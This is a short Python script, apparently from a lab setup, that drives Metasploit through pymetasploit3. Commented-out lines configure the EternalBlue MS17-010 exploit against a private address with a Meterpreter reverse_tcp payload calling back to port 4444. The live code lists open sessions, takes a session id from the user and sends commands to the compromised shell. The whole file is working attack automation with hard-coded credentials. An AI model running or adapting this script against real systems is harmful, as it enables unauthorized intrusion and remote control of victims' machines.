from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('password')
# from pymetasploit3.msfrpc import MsfRpcClient
# client = MsfRpcClient('password', port=55552)
#exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
#exploit['RHOSTS'] = '192.168.186.128'
#payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
#payload['LHOST'] = '192.168.186.129'
#payload['LPORT'] = 4444
#exploit.execute(payload=payload)
client.sessions.list # 查看session列表
print(client.sessions.list)
number1 = input('选择session id:\n')
shell = client.sessions.session(number1)
shell.write('?')
print(shell.read())